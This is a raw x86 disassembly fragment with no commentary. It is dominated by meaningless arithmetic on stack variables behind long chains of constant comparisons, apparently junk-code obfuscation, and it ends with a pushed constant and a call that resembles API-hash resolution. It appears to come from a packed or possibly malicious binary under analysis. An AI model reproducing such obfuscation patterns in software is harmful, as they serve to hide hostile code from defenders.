  4066f1:	or     DWORD PTR [ebp-0x4c],eax
  4066f4:	mov    ebx,DWORD PTR [ebp-0x4c]
  4066f7:	and    DWORD PTR [ebp-0x54],ebx
  4066fa:	mov    edx,DWORD PTR ds:0x435408
  406700:	and    esi,ecx
  406702:	cmp    esi,DWORD PTR ds:0x435430
  406708:	jne    0x40675e
  40670a:	and    esi,eax
  40670c:	mov    eax,DWORD PTR [ebp-0x54]
  40670f:	mov    ebx,DWORD PTR [ebp-0x4c]
  406712:	cmp    eax,0x5c
  406715:	je     0x40675e
  406717:	or     DWORD PTR [ebp-0x4c],edx
  40671a:	test   esi,0x81
  406720:	jne    0x40675e
  406722:	xor    edx,edx
  406724:	or     DWORD PTR [ebp-0x54],esi
  406727:	cmp    eax,DWORD PTR [ebp-0x30]
  40672a:	jne    0x40675e
  40672c:	cmp    eax,0x1f
  40672f:	je     0x40675e
  406731:	add    edx,ebx
  406733:	mov    edi,DWORD PTR [ebp-0x4c]
  406736:	mov    esi,0xf341
  40673b:	sub    DWORD PTR [ebp-0x4c],eax
  40673e:	cmp    edi,0x29
  406741:	jne    0x40675e
  406743:	sub    edi,edx
  406745:	sub    DWORD PTR [ebp-0x4c],edi
  406748:	test   ebx,0xc3
  40674e:	jne    0x40675b
  406750:	cmp    edi,DWORD PTR ds:0x43542c
  406756:	jne    0x40675b
  406758:	sub    DWORD PTR [ebp-0x54],edi
  40675b:	sub    DWORD PTR [ebp-0x54],esi
  40675e:	add    ecx,esi
  406760:	sub    ecx,esi
  406762:	mov    esi,0x73
  406767:	sub    DWORD PTR [ebp-0x4c],esi
  40676a:	sub    ecx,ebx
  40676c:	mov    edi,DWORD PTR [ebp-0x54]
  40676f:	cmp    ecx,esi
  406771:	jne    0x4067af
  406773:	test   ecx,0x9e
  406779:	je     0x4067af
  40677b:	mov    eax,DWORD PTR [ebp-0x4c]
  40677e:	add    eax,edi
  406780:	mov    esi,0x9be5
  406785:	cmp    eax,0xb709
  40678a:	je     0x4067af
  40678c:	sub    DWORD PTR [ebp-0x54],eax
  40678f:	mov    edi,0x3f
  406794:	mov    ebx,DWORD PTR [ebp-0x54]
  406797:	add    DWORD PTR [ebp-0x54],esi
  40679a:	add    DWORD PTR [ebp-0x4c],ebx
  40679d:	sub    DWORD PTR [ebp-0x54],ecx
  4067a0:	or     DWORD PTR [ebp-0x4c],edx
  4067a3:	sub    edi,ecx
  4067a5:	sub    DWORD PTR [ebp-0x4c],eax
  4067a8:	add    edi,esi
  4067aa:	and    edi,ebx
  4067ac:	add    DWORD PTR [ebp-0x4c],edi
  4067af:	cmp    eax,0x2
  4067b2:	je     0x4067b7
  4067b4:	sub    DWORD PTR [ebp-0x54],eax
  4067b7:	test   edi,0xfb1d
  4067bd:	je     0x4067ca
  4067bf:	mov    eax,DWORD PTR [ebp-0x4c]
  4067c2:	xor    edx,edx
  4067c4:	add    DWORD PTR [ebp-0x54],eax
  4067c7:	sub    DWORD PTR [ebp-0x4c],edx
  4067ca:	mov    edi,DWORD PTR [ebp-0x4c]
  4067cd:	mov    edx,DWORD PTR [ebp-0x4c]
  4067d0:	cmp    edx,DWORD PTR ds:0x435430
  4067d6:	jne    0x406814
  4067d8:	or     edi,ebx
  4067da:	cmp    edi,eax
  4067dc:	je     0x406814
  4067de:	cmp    ebx,DWORD PTR ds:0x435420
  4067e4:	je     0x406814
  4067e6:	add    DWORD PTR [ebp-0x54],edi
  4067e9:	cmp    edx,DWORD PTR ds:0x43542c
  4067ef:	jne    0x406814
  4067f1:	mov    esi,DWORD PTR [ebp-0x4c]
  4067f4:	cmp    edx,DWORD PTR ds:0x435420
  4067fa:	je     0x406814
  4067fc:	mov    ebx,DWORD PTR [ebp-0x4c]
  4067ff:	mov    edi,DWORD PTR [ebp-0x54]
  406802:	or     esi,eax
  406804:	sub    DWORD PTR [ebp-0x54],edi
  406807:	sub    edx,ecx
  406809:	sub    DWORD PTR [ebp-0x54],esi
  40680c:	sub    DWORD PTR [ebp-0x54],edx
  40680f:	add    ebx,edx
  406811:	or     DWORD PTR [ebp-0x4c],ebx
  406814:	mov    ecx,DWORD PTR [ebp-0x4c]
  406817:	cmp    ecx,0x3a
  40681a:	je     0x406824
  40681c:	sub    ecx,edx
  40681e:	add    DWORD PTR [ebp-0x54],edi
  406821:	sub    DWORD PTR [ebp-0x4c],ecx
  406824:	and    edi,esi
  406826:	cmp    ecx,DWORD PTR [ebp-0x48]
  406829:	jne    0x406849
  40682b:	mov    ebx,DWORD PTR [ebp-0x54]
  40682e:	mov    eax,DWORD PTR [ebp-0x54]
  406831:	and    DWORD PTR [ebp-0x4c],eax
  406834:	and    edi,esi
  406836:	sub    ebx,edi
  406838:	sub    ebx,esi
  40683a:	sub    ebx,edx
  40683c:	sub    ebx,edi
  40683e:	cmp    ebx,DWORD PTR ds:0x435440
  406844:	je     0x406849
  406846:	add    DWORD PTR [ebp-0x54],ebx
  406849:	add    ebx,edi
  40684b:	mov    DWORD PTR [ebp-0x24],ebx
  40684e:	sub    DWORD PTR [ebp-0x54],edi
  406851:	sub    esi,edi
  406853:	cmp    esi,ebx
  406855:	je     0x406984
  40685b:	mov    ebx,0x33
  406860:	add    ebx,edi
  406862:	add    DWORD PTR [ebp-0x24],esi
  406865:	mov    esi,DWORD PTR [ebp-0x24]
  406868:	add    DWORD PTR [ebp-0x54],esi
  40686b:	test   edx,0xf4
  406871:	je     0x406984
  406877:	mov    eax,DWORD PTR [ebp-0x54]
  40687a:	mov    esi,DWORD PTR [ebp-0x54]
  40687d:	test   eax,0xb977
  406882:	je     0x406984
  406888:	mov    ecx,ebx
  40688a:	cmp    esi,DWORD PTR ds:0x435440
  406890:	je     0x406984
  406896:	xor    edx,edx
  406898:	mov    edi,DWORD PTR ds:0x435420
  40689e:	add    DWORD PTR [ebp-0x54],edi
  4068a1:	add    esi,edx
  4068a3:	sub    DWORD PTR [ebp-0x54],eax
  4068a6:	or     esi,edx
  4068a8:	add    DWORD PTR [ebp-0x24],edx
  4068ab:	sub    DWORD PTR [ebp-0x54],edi
  4068ae:	cmp    esi,DWORD PTR ds:0x43542c
  4068b4:	jne    0x406984
  4068ba:	mov    edi,DWORD PTR [ebp-0x24]
  4068bd:	cmp    esi,0x55
  4068c0:	jne    0x406984
  4068c6:	cmp    edi,DWORD PTR [ebp-0xc]
  4068c9:	je     0x406984
  4068cf:	sub    edi,esi
  4068d1:	cmp    edi,DWORD PTR [ebp-0x30]
  4068d4:	jne    0x406984
  4068da:	mov    eax,0xa391
  4068df:	add    ecx,ebx
  4068e1:	add    DWORD PTR [ebp-0x54],ecx
  4068e4:	cmp    edi,DWORD PTR [ebp-0x24]
  4068e7:	jne    0x406984
  4068ed:	mov    esi,0xa3
  4068f2:	mov    edx,DWORD PTR [ebp-0x54]
  4068f5:	add    edx,esi
  4068f7:	cmp    edx,0x33
  4068fa:	jne    0x406984
  406900:	mov    ecx,DWORD PTR [ebp-0x24]
  406903:	mov    DWORD PTR [ebp-0x54],ebx
  406906:	add    edi,edi
  406908:	add    edi,ebx
  40690a:	add    eax,edi
  40690c:	add    DWORD PTR [ebp-0x4c],edx
  40690f:	cmp    eax,DWORD PTR [ebp-0x14]
  406912:	jne    0x406984
  406914:	mov    edx,DWORD PTR [ebp-0x54]
  406917:	mov    esi,DWORD PTR [ebp-0x4c]
  40691a:	sub    DWORD PTR [ebp-0x24],eax
  40691d:	sub    DWORD PTR [ebp-0x24],esi
  406920:	cmp    ecx,0x7e
  406923:	jne    0x406984
  406925:	cmp    edx,0x7436
  40692b:	je     0x406984
  40692d:	mov    eax,0x81004063
  406932:	add    edx,eax
  406934:	sub    DWORD PTR [ebp-0x24],edx
  406937:	mov    eax,0xfbd7
  40693c:	add    ecx,edx
  40693e:	or     DWORD PTR [ebp-0x4c],ecx
  406941:	add    eax,edx
  406943:	or     eax,esi
  406945:	cmp    eax,DWORD PTR [ebp-0x54]
  406948:	jne    0x406984
  40694a:	mov    edx,DWORD PTR [ebp-0x54]
  40694d:	xor    edi,edi
  40694f:	sub    edx,ecx
  406951:	cmp    eax,edx
  406953:	jne    0x406984
  406955:	and    eax,ebx
  406957:	and    DWORD PTR [ebp-0x4c],ecx
  40695a:	cmp    eax,DWORD PTR [ebp-0x4c]
  40695d:	je     0x406984
  40695f:	add    DWORD PTR [ebp-0x24],eax
  406962:	or     edi,edx
  406964:	add    edi,ebx
  406966:	add    edi,edx
  406968:	mov    esi,0xea
  40696d:	cmp    ebx,eax
  40696f:	je     0x406984
  406971:	sub    edi,esi
  406973:	mov    ebx,eax
  406975:	cmp    edi,0xc622
  40697b:	je     0x406984
  40697d:	and    ebx,esi
  40697f:	add    edi,ebx
  406981:	add    DWORD PTR [ebp-0x24],edi
  406984:	xor    edx,edx
  406986:	mov    eax,DWORD PTR [ebp-0x4c]
  406989:	add    DWORD PTR [ebp-0x24],eax
  40698c:	add    edx,edi
  40698e:	cmp    edx,0xffffff89
  406991:	jne    0x40699e
  406993:	cmp    edx,DWORD PTR ds:0x43542c
  406999:	jne    0x40699e
  40699b:	add    DWORD PTR [ebp-0x24],edx
  40699e:	mov    esi,0x5a
  4069a3:	add    esi,edx
  4069a5:	cmp    ecx,DWORD PTR [ebp-0x44]
  4069a8:	je     0x4069bb
  4069aa:	mov    ecx,0x8a
  4069af:	add    esi,edi
  4069b1:	or     ecx,ebx
  4069b3:	mov    edx,ecx
  4069b5:	sub    DWORD PTR [ebp-0x4c],edx
  4069b8:	add    DWORD PTR [ebp-0x4c],esi
  4069bb:	cmp    esi,DWORD PTR [ebp-0x28]
  4069be:	je     0x4069d9
  4069c0:	cmp    edx,0x477d
  4069c6:	jne    0x4069d9
  4069c8:	cmp    edi,esi
  4069ca:	jne    0x4069d9
  4069cc:	mov    edi,edx
  4069ce:	mov    DWORD PTR [ebp-0x4],ecx
  4069d1:	xor    edx,edx
  4069d3:	or     DWORD PTR [ebp-0x4],edi
  4069d6:	sub    DWORD PTR [ebp-0x24],edx
  4069d9:	add    ecx,ebx
  4069db:	add    DWORD PTR [ebp-0x4c],ecx
  4069de:	mov    esi,DWORD PTR ds:0x43544c
  4069e4:	sub    DWORD PTR [ebp-0x4c],ebx
  4069e7:	cmp    ebx,DWORD PTR ds:0x435408
  4069ed:	jne    0x406a34
  4069ef:	sub    esi,eax
  4069f1:	mov    eax,DWORD PTR [ebp-0x54]
  4069f4:	add    esi,edx
  4069f6:	xor    ebx,ebx
  4069f8:	add    DWORD PTR [ebp-0x24],esi
  4069fb:	sub    DWORD PTR [ebp-0x4c],eax
  4069fe:	cmp    ecx,0x4a5a
  406a04:	jne    0x406a09
  406a06:	add    DWORD PTR [ebp-0x24],edi
  406a09:	add    ebx,esi
  406a0b:	or     ebx,edi
  406a0d:	sub    ebx,esi
  406a0f:	cmp    ebx,DWORD PTR ds:0x43542c
  406a15:	jne    0x406a34
  406a17:	xor    ecx,ecx
  406a19:	sub    ebx,ecx
  406a1b:	mov    esi,ebx
  406a1d:	and    esi,eax
  406a1f:	sub    DWORD PTR [ebp-0x54],ebx
  406a22:	cmp    eax,0xff99
  406a27:	jne    0x406a34
  406a29:	test   esi,0x55298041
  406a2f:	je     0x406a34
  406a31:	or     DWORD PTR [ebp-0x54],esi
  406a34:	and    esi,ebx
  406a36:	mov    eax,0x25
  406a3b:	or     DWORD PTR [ebp-0x4c],esi
  406a3e:	mov    edi,DWORD PTR ds:0x435414
  406a44:	cmp    esi,DWORD PTR [ebp-0x10]
  406a47:	je     0x406aa1
  406a49:	mov    esi,ebx
  406a4b:	mov    ecx,DWORD PTR [ebp-0x24]
  406a4e:	add    esi,edi
  406a50:	cmp    ecx,DWORD PTR ds:0x435430
  406a56:	jne    0x406aa1
  406a58:	cmp    esi,0x454406c0
  406a5e:	jne    0x406aa1
  406a60:	sub    DWORD PTR [ebp-0x4c],eax
  406a63:	cmp    esi,0x41
  406a66:	je     0x406aa1
  406a68:	mov    edi,DWORD PTR [ebp-0x4c]
  406a6b:	cmp    esi,DWORD PTR [ebp-0x24]
  406a6e:	jne    0x406aa1
  406a70:	add    esi,ecx
  406a72:	or     esi,ebx
  406a74:	and    esi,ebx
  406a76:	mov    ebx,DWORD PTR [ebp-0x4c]
  406a79:	mov    ecx,DWORD PTR [ebp-0x54]
  406a7c:	or     DWORD PTR [ebp-0x4c],ebx
  406a7f:	cmp    esi,0xe4be
  406a85:	je     0x406aa1
  406a87:	sub    DWORD PTR [ebp-0x4c],edx
  406a8a:	mov    ebx,esi
  406a8c:	xor    esi,esi
  406a8e:	sub    ecx,edi
  406a90:	sub    ecx,esi
  406a92:	sub    DWORD PTR [ebp-0x4c],ecx
  406a95:	sub    ebx,eax
  406a97:	cmp    ebx,DWORD PTR [ebp-0xc]
  406a9a:	jne    0x406aa1
  406a9c:	and    ebx,edi
  406a9e:	sub    DWORD PTR [ebp-0x4c],ebx
  406aa1:	test   ecx,0x61
  406aa7:	jne    0x406aac
  406aa9:	add    DWORD PTR [ebp-0x4c],ebx
  406aac:	mov    edi,0x8e
  406ab1:	sub    edi,edx
  406ab3:	add    edi,ebx
  406ab5:	sub    edi,esi
  406ab7:	mov    esi,0x3f8b
  406abc:	cmp    ecx,DWORD PTR ds:0x435408
  406ac2:	jne    0x406afb
  406ac4:	mov    ebx,esi
  406ac6:	mov    edx,DWORD PTR [ebp-0x54]
  406ac9:	sub    DWORD PTR [ebp-0x4c],edx
  406acc:	add    DWORD PTR [ebp-0x4c],ecx
  406acf:	cmp    edi,edx
  406ad1:	je     0x406afb
  406ad3:	mov    esi,DWORD PTR [ebp-0x4c]
  406ad6:	mov    ecx,DWORD PTR [ebp-0x24]
  406ad9:	cmp    ecx,0x85b5
  406adf:	je     0x406afb
  406ae1:	mov    eax,0x96
  406ae6:	and    DWORD PTR [ebp-0x54],eax
  406ae9:	mov    eax,0xec
  406aee:	and    ebx,esi
  406af0:	add    edi,eax
  406af2:	add    DWORD PTR [ebp-0x4c],edi
  406af5:	sub    DWORD PTR [ebp-0x54],ebx
  406af8:	add    DWORD PTR [ebp-0x24],ecx
  406afb:	mov    ecx,0xee40
  406b00:	or     ecx,ebx
  406b02:	test   ecx,0x66
  406b08:	jne    0x406b53
  406b0a:	mov    edi,edx
  406b0c:	mov    esi,edi
  406b0e:	cmp    ecx,DWORD PTR [ebp-0x10]
  406b11:	jne    0x406b53
  406b13:	mov    ebx,DWORD PTR [ebp-0x24]
  406b16:	mov    edx,DWORD PTR [ebp-0x4c]
  406b19:	cmp    ecx,DWORD PTR [ebp-0x20]
  406b1c:	je     0x406b53
  406b1e:	mov    DWORD PTR [ebp-0x24],ebx
  406b21:	xor    edi,edi
  406b23:	sub    DWORD PTR [ebp-0x24],esi
  406b26:	or     DWORD PTR [ebp-0x4c],ecx
  406b29:	xor    DWORD PTR [ebp-0x54],edx
  406b2c:	xor    eax,eax
  406b2e:	cmp    edx,DWORD PTR [ebp-0x4c]
  406b31:	je     0x406b53
  406b33:	add    DWORD PTR [ebp-0x24],edx
  406b36:	add    DWORD PTR [ebp-0x54],eax
  406b39:	sub    edi,edx
  406b3b:	mov    ebx,0x7f
  406b40:	mov    ebx,0xcea3
  406b45:	add    DWORD PTR [ebp-0x24],edi
  406b48:	add    DWORD PTR [ebp-0x24],eax
  406b4b:	add    DWORD PTR [ebp-0x24],edi
  406b4e:	and    ebx,eax
  406b50:	sub    DWORD PTR [ebp-0x24],ebx
  406b53:	mov    esi,DWORD PTR [ebp-0x24]
  406b56:	add    esi,ebx
  406b58:	cmp    esi,DWORD PTR [ebp-0x48]
  406b5b:	jne    0x406cff
  406b61:	test   esi,0xd0
  406b67:	je     0x406cff
  406b6d:	xor    eax,eax
  406b6f:	mov    ebx,DWORD PTR [ebp-0x4c]
  406b72:	test   ebx,0xf1
  406b78:	jne    0x406cff
  406b7e:	or     DWORD PTR [ebp-0x24],esi
  406b81:	mov    edx,eax
  406b83:	mov    edi,0x7a4d
  406b88:	xor    DWORD PTR [ebp-0x54],edi
  406b8b:	cmp    esi,0xffffffb0
  406b8e:	je     0x406cff
  406b94:	mov    ecx,edi
  406b96:	cmp    ebx,DWORD PTR [ebp-0x5c]
  406b99:	jne    0x406cff
  406b9f:	mov    edi,esi
  406ba1:	sub    ecx,eax
  406ba3:	mov    edx,DWORD PTR [ebp-0x24]
  406ba6:	and    ebx,esi
  406ba8:	or     ecx,eax
  406baa:	test   edi,0x37
  406bb0:	je     0x406cff
  406bb6:	or     DWORD PTR [ebp-0x54],ecx
  406bb9:	mov    ecx,0xf4
  406bbe:	mov    eax,0x75
  406bc3:	cmp    ebx,DWORD PTR ds:0x435420
  406bc9:	jne    0x406cff
  406bcf:	mov    esi,DWORD PTR [ebp-0x24]
  406bd2:	mov    ecx,DWORD PTR [ebp-0x4c]
  406bd5:	sub    DWORD PTR [ebp-0x54],esi
  406bd8:	cmp    edi,DWORD PTR ds:0x43542c
  406bde:	jne    0x406cff
  406be4:	mov    esi,DWORD PTR [ebp-0x24]
  406be7:	cmp    edx,DWORD PTR [ebp-0x5c]
  406bea:	je     0x406cff
  406bf0:	sub    edx,esi
  406bf2:	or     edx,esi
  406bf4:	mov    esi,0x5293
  406bf9:	xor    DWORD PTR [ebp-0x54],edx
  406bfc:	add    ebx,esi
  406bfe:	cmp    edi,DWORD PTR [ebp-0x28]
  406c01:	je     0x406cff
  406c07:	test   ebx,0x16
  406c0d:	jne    0x406cff
  406c13:	mov    esi,DWORD PTR [ebp-0x4c]
  406c16:	add    ebx,esi
  406c18:	or     DWORD PTR [ebp-0x54],ebx
  406c1b:	sub    edi,eax
  406c1d:	mov    ebx,0x83
  406c22:	or     DWORD PTR [ebp-0x24],edx
  406c25:	sub    edi,ebx
  406c27:	add    ecx,edi
  406c29:	and    ecx,ebx
  406c2b:	add    ecx,ebx
  406c2d:	cmp    ecx,DWORD PTR ds:0x435408
  406c33:	je     0x406cff
  406c39:	mov    esi,DWORD PTR ds:0x43542c
  406c3f:	cmp    ecx,0xffffffea
  406c42:	je     0x406cff
  406c48:	cmp    edi,DWORD PTR [ebp-0x8]
  406c4b:	jne    0x406cff
  406c51:	mov    ebx,0x6
  406c56:	mov    edi,0x32
  406c5b:	cmp    ecx,0xffffffb3
  406c5e:	jne    0x406cff
  406c64:	mov    edx,DWORD PTR [ebp-0x54]
  406c67:	sub    DWORD PTR [ebp-0x24],esi
  406c6a:	sub    ecx,esi
  406c6c:	mov    eax,DWORD PTR ds:0x43542c
  406c72:	cmp    ecx,0x35
  406c75:	je     0x406cff
  406c7b:	add    ecx,edi
  406c7d:	test   ecx,0xfdc4
  406c83:	je     0x406cff
  406c85:	cmp    ecx,DWORD PTR [ebp-0x4c]
  406c88:	jne    0x406cff
  406c8a:	mov    esi,0x76
  406c8f:	mov    edi,DWORD PTR [ebp-0x24]
  406c92:	add    esi,eax
  406c94:	mov    DWORD PTR [ebp-0x24],edx
  406c97:	add    DWORD PTR [ebp-0x54],esi
  406c9a:	test   ecx,0x3f
  406ca0:	jne    0x406cff
  406ca2:	mov    eax,DWORD PTR [ebp-0x54]
  406ca5:	add    eax,ebx
  406ca7:	mov    edx,esi
  406ca9:	test   edi,0x60
  406caf:	jne    0x406cff
  406cb1:	sub    DWORD PTR [ebp-0x54],ecx
  406cb4:	mov    ebx,DWORD PTR ds:0x435424
  406cba:	and    edx,esi
  406cbc:	sub    DWORD PTR [ebp-0x54],edi
  406cbf:	xor    edi,edi
  406cc1:	sub    ebx,esi
  406cc3:	sub    DWORD PTR [ebp-0x54],edx
  406cc6:	cmp    ecx,0xffffffb1
  406cc9:	je     0x406cff
  406ccb:	mov    esi,DWORD PTR ds:0x435430
  406cd1:	sub    DWORD PTR [ebp-0x4c],eax
  406cd4:	or     DWORD PTR [ebp-0x4c],ebx
  406cd7:	mov    ecx,DWORD PTR [ebp-0x54]
  406cda:	add    edi,edi
  406cdc:	add    edi,edx
  406cde:	add    ecx,ebx
  406ce0:	or     esi,ebx
  406ce2:	cmp    ecx,DWORD PTR ds:0x435430
  406ce8:	jne    0x406cff
  406cea:	sub    edi,ecx
  406cec:	add    esi,esi
  406cee:	mov    DWORD PTR [ebp-0x58],edi
  406cf1:	add    esi,edx
  406cf3:	sub    esi,ebx
  406cf5:	cmp    ecx,0xffffffa2
  406cf8:	jne    0x406cff
  406cfa:	and    esi,eax
  406cfc:	add    DWORD PTR [ebp-0x54],esi
  406cff:	mov    eax,DWORD PTR ds:0x43540c
  406d05:	mov    ecx,DWORD PTR ds:0x435438
  406d0b:	or     DWORD PTR [ebp-0x4c],ecx
  406d0e:	or     eax,ecx
  406d10:	sub    eax,edx
  406d12:	or     DWORD PTR [ebp-0x4c],edi
  406d15:	sub    eax,edi
  406d17:	cmp    eax,DWORD PTR ds:0x435408
  406d1d:	jne    0x406d49
  406d1f:	mov    esi,DWORD PTR [ebp-0x24]
  406d22:	add    esi,ecx
  406d24:	mov    edi,DWORD PTR [ebp-0x24]
  406d27:	add    DWORD PTR [ebp-0x4c],eax
  406d2a:	sub    edi,eax
  406d2c:	xor    DWORD PTR [ebp-0x24],edi
  406d2f:	sub    esi,ecx
  406d31:	cmp    esi,ebx
  406d33:	je     0x406d49
  406d35:	sub    esi,eax
  406d37:	mov    ecx,DWORD PTR [ebp-0x54]
  406d3a:	add    esi,eax
  406d3c:	mov    edi,ebx
  406d3e:	add    DWORD PTR [ebp-0x54],esi
  406d41:	add    edi,ebx
  406d43:	sub    DWORD PTR [ebp-0x24],edi
  406d46:	or     DWORD PTR [ebp-0x4c],ecx
  406d49:	xor    DWORD PTR [ebp-0x24],eax
  406d4c:	mov    eax,ebx
  406d4e:	mov    DWORD PTR [ebp-0x54],ebx
  406d51:	mov    ebx,DWORD PTR [ebp-0x4c]
  406d54:	add    eax,ebx
  406d56:	cmp    eax,0xffffffb7
  406d59:	jne    0x406d7d
  406d5b:	mov    ebx,0xe5
  406d60:	sub    DWORD PTR [ebp-0x24],edi
  406d63:	mov    ecx,DWORD PTR [ebp-0x54]
  406d66:	add    DWORD PTR [ebp-0x54],ebx
  406d69:	or     eax,ebx
  406d6b:	sub    ecx,esi
  406d6d:	add    eax,eax
  406d6f:	add    DWORD PTR [ebp-0x54],ecx
  406d72:	cmp    eax,DWORD PTR ds:0x43540c
  406d78:	jne    0x406d7d
  406d7a:	add    DWORD PTR [ebp-0x24],eax
  406d7d:	lea    ebx,[ebp-0x3c]
  406d80:	cmp    ebx,0xffffff92
  406d83:	jne    0x406da6
  406d85:	xor    edi,edi
  406d87:	mov    esi,DWORD PTR [ebp-0x54]
  406d8a:	cmp    ebx,0x39
  406d8d:	jne    0x406da6
  406d8f:	mov    edi,0xc
  406d94:	and    DWORD PTR [ebp-0x54],edi
  406d97:	sub    esi,edi
  406d99:	mov    ecx,0x4674
  406d9e:	and    esi,ecx
  406da0:	xor    DWORD PTR [ebp-0x4c],ebx
  406da3:	or     DWORD PTR [ebp-0x4c],esi
  406da6:	mov    ecx,DWORD PTR [ebp-0x24]
  406da9:	xor    DWORD PTR [ebp-0x54],ecx
  406dac:	push   ebx
  406dad:	mov    ebx,0xf1
  406db2:	mov    DWORD PTR [ebp-0x54],eax
  406db5:	mov    ebx,DWORD PTR [ebp-0x54]
  406db8:	sub    ebx,edi
  406dba:	cmp    ebx,0xf196
  406dc0:	jne    0x406f2f
  406dc6:	cmp    ebx,esi
  406dc8:	je     0x406f2f
  406dce:	mov    esi,DWORD PTR ds:0x435400
  406dd4:	xor    ecx,ecx
  406dd6:	add    esi,ecx
  406dd8:	sub    esi,edx
  406dda:	sub    ebx,eax
  406ddc:	sub    DWORD PTR [ebp-0x4c],ebx
  406ddf:	sub    edx,ebx
  406de1:	add    esi,edx
  406de3:	cmp    esi,0xffffffe6
  406de6:	jne    0x406f2f
  406dec:	test   esi,0x6a
  406df2:	je     0x406f2f
  406df8:	mov    edx,DWORD PTR [ebp-0x4c]
  406dfb:	cmp    edx,0xffffffb7
  406dfe:	jne    0x406f2f
  406e04:	mov    ecx,DWORD PTR [ebp-0x54]
  406e07:	xor    edi,edi
  406e09:	add    edi,ebx
  406e0b:	add    edx,edx
  406e0d:	cmp    edi,0xd7d2
  406e13:	je     0x406f2f
  406e19:	add    DWORD PTR [ebp-0x4c],ecx
  406e1c:	mov    ebx,DWORD PTR [ebp-0x4c]
  406e1f:	and    DWORD PTR [ebp-0x24],esi
  406e22:	mov    ecx,DWORD PTR [ebp-0x54]
  406e25:	add    edi,ecx
  406e27:	add    DWORD PTR [ebp-0x4c],edi
  406e2a:	test   ebx,0x8322
  406e30:	je     0x406f2f
  406e36:	mov    edi,0x8c01000
  406e3b:	mov    ecx,DWORD PTR ds:0x435410
  406e41:	sub    DWORD PTR [ebp-0x24],ebx
  406e44:	sub    DWORD PTR [ebp-0x24],eax
  406e47:	cmp    edx,0x5a9
  406e4d:	je     0x406f2f
  406e53:	add    DWORD PTR [ebp-0x4c],ebx
  406e56:	mov    ecx,DWORD PTR [ebp-0x54]
  406e59:	cmp    ecx,DWORD PTR ds:0x435430
  406e5f:	je     0x406f2f
  406e65:	mov    esi,DWORD PTR [ebp-0x4c]
  406e68:	mov    edi,DWORD PTR [ebp-0x24]
  406e6b:	sub    edi,eax
  406e6d:	sub    ecx,eax
  406e6f:	cmp    edi,edx
  406e71:	je     0x406f2f
  406e77:	mov    eax,0xc4
  406e7c:	cmp    ecx,0xffffffa5
  406e7f:	jne    0x406f2f
  406e85:	add    eax,edx
  406e87:	mov    ebx,edi
  406e89:	mov    edi,DWORD PTR [ebp-0x4c]
  406e8c:	cmp    eax,esi
  406e8e:	jne    0x406f2f
  406e94:	sub    ebx,esi
  406e96:	mov    esi,DWORD PTR [ebp-0x4c]
  406e99:	cmp    esi,eax
  406e9b:	jne    0x406f2f
  406ea1:	and    ecx,ebx
  406ea3:	add    eax,esi
  406ea5:	mov    edx,DWORD PTR [ebp-0x54]
  406ea8:	mov    ebx,0x2b
  406ead:	mov    DWORD PTR [ebp-0x54],edi
  406eb0:	cmp    edx,0x7fbd
  406eb6:	jne    0x406f2f
  406eb8:	mov    edi,ebx
  406eba:	xor    ebx,ebx
  406ebc:	or     DWORD PTR [ebp-0x54],ebx
  406ebf:	cmp    eax,0x1
  406ec2:	je     0x406f2f
  406ec4:	mov    ebx,0xe4a1
  406ec9:	or     DWORD PTR [ebp-0x4c],edi
  406ecc:	mov    esi,DWORD PTR [ebp-0x54]
  406ecf:	cmp    edx,eax
  406ed1:	je     0x406f2f
  406ed3:	or     eax,edx
  406ed5:	add    ebx,esi
  406ed7:	xor    edx,edx
  406ed9:	test   esi,0x6f
  406edf:	jne    0x406f2f
  406ee1:	mov    esi,DWORD PTR [ebp-0x24]
  406ee4:	sub    DWORD PTR [ebp-0x54],edx
  406ee7:	sub    DWORD PTR [ebp-0x54],eax
  406eea:	cmp    ebx,ecx
  406eec:	jne    0x406f2f
  406eee:	xor    edi,edi
  406ef0:	cmp    eax,0xafa0
  406ef5:	jne    0x406f2f
  406ef7:	add    DWORD PTR [ebp-0x4c],edx
  406efa:	mov    eax,edx
  406efc:	cmp    ebx,DWORD PTR [ebp-0x4c]
  406eff:	je     0x406f2f
  406f01:	mov    eax,0xe5
  406f06:	mov    edx,0x66
  406f0b:	and    DWORD PTR [ebp-0x4c],edx
  406f0e:	cmp    esi,0xffffffc2
  406f11:	je     0x406f2f
  406f13:	sub    edi,esi
  406f15:	xor    edx,edx
  406f17:	and    ebx,edi
  406f19:	mov    esi,0xcf
  406f1e:	sub    DWORD PTR [ebp-0x54],ebx
  406f21:	add    DWORD PTR [ebp-0x4c],eax
  406f24:	or     DWORD PTR [ebp-0x4c],esi
  406f27:	add    DWORD PTR [ebp-0x54],edx
  406f2a:	sub    ecx,ebx
  406f2c:	add    DWORD PTR [ebp-0x54],ecx
  406f2f:	push   0xe514bca0
  406f34:	mov    ebx,DWORD PTR [ebp-0x54]
  406f37:	cmp    ebx,0xffffffe6
  406f3a:	je     0x406f5e
  406f3c:	cmp    ebx,0xffffff82
  406f3f:	je     0x406f5e
  406f41:	mov    eax,0xd8
  406f46:	cmp    ebx,DWORD PTR [ebp-0x44]
  406f49:	je     0x406f5e
  406f4b:	sub    DWORD PTR [ebp-0x24],ebx
  406f4e:	mov    edx,DWORD PTR [ebp-0x54]
  406f51:	xor    DWORD PTR [ebp-0x4c],edx
  406f54:	xor    ebx,ebx
  406f56:	xor    DWORD PTR [ebp-0x54],eax
  406f59:	sub    ebx,esi
  406f5b:	mov    DWORD PTR [ebp-0x54],ebx
  406f5e:	add    DWORD PTR [ebp-0x54],edx
  406f61:	call   0x4073b6
  406f66:	sub    eax,ebx
  406f68:	mov    edx,esi
  406f6a:	sub    edx,edi
  406f6c:	add    DWORD PTR [ebp-0x4c],esi
  406f6f:	and    edx,esi
  406f71:	xor    DWORD PTR [ebp-0x54],eax
  406f74:	xor    eax,eax
  406f76:	add    eax,ebx
  406f78:	sub    DWORD PTR [ebp-0x24],edx
  406f7b:	sub    eax,edx
  406f7d:	cmp    eax,edx
  406f7f:	jne    0x40705b
  406f85:	cmp    eax,esi
  406f87:	jne    0x40705b
  406f8d:	mov    edi,DWORD PTR [ebp-0x54]
  406f90:	or     DWORD PTR [ebp-0x4c],edx
  406f93:	mov    esi,0xae
  406f98:	add    esi,edx
  406f9a:	sub    DWORD PTR [ebp-0x54],edi
  406f9d:	cmp    esi,edx
  406f9f:	jne    0x40705b
  406fa5:	xor    edi,edi
  406fa7:	mov    ecx,DWORD PTR [ebp-0x54]
  406faa:	add    DWORD PTR [ebp-0x4c],esi
  406fad:	add    DWORD PTR [ebp-0x24],edi
  406fb0:	add    ecx,edi
  406fb2:	cmp    eax,0x48
  406fb5:	jne    0x40705b
